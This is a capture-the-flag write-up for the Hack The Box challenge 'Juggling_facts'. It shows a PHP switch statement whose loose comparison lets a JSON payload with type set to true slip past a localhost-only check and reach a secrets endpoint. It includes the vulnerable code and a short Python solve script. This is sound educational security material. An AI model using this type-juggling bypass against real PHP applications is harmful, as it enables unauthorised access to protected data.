---
title: Juggling_facts
date: 2023-12-09 15:53:16 +0800
categories: [Hackthebox-Challenges, Juggling_facts]
tags: [htb, ctf, pentesting, web, code-auditing]
---


<img src="/assets/global/banner.png" alt="banner image">

## Juggling_facts is a PHP chalenge on Hackthebox

### Description:

This challenge allows you to choose between some type of option called facts,\
but to access the **secret** one that contains out FLAG you need to access this site from localhost,\
we can't do that but after some code auditing it was using switch case,\
 and furtunatly it's vulnerble to `loose comparison`.

### Source code:
<a href='https://mega.nz/file/CbJRgSjT#XFf7s4AVC-WkkqPq6Rxz9DT3J1DZBL4o-jCVH11ZW4I'>Download source code</a>

*zip password: `hackthebox`*


### Vulnerable code:
```php
        if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
        }
# as you see if the user input equals `secret` and the request didn't come from localhost an error message returned.
```

```php
 public function getfacts($router)
    {
        $jsondata = json_decode(file_get_contents('php://input'), true);

        if ( empty($jsondata) || !array_key_exists('type', $jsondata))
        {
            return $router->jsonify(['message' => 'Insufficient parameters!']);
        }

        if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
        }

        switch ($jsondata['type'])
        {
            case 'secrets': // here where the `loose comparison` happenes
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('secrets')
                ]);

            case 'spooky':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('spooky')
                ]);
            
            case 'not_spooky':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('not_spooky')
                ]);
            
            default:
                return $router->jsonify([
                    'message' => 'Invalid type!'
                ]);
        }
    }

```

to understand more about this issue take a look at `switch case` manual in php.net.

<img src="/assets/juggling_facts/loose-comparison.png" alt="lose comparison image">

so to exploit this take a look at this table provided by `PHP` manual.


<img src="/assets/juggling_facts/table.png" alt="lose comparison table image">

As you can see if we have for example `case "secret":` and we pass `true` in the `option(true)` parameter.\
it will match the secret because it uses only two equals `==` not three.



### Solve:

```python


import requests


payload = """
    {
        "type":true
    }
"""
url = 'http://localhost:1337/api/getfacts'
headers = {'Content-Type': 'application/json'}
res = requests.post(url, data=payload, headers=headers)
if res.status_code == 200:
    print(res.text)
else:
    print(res.status)


```

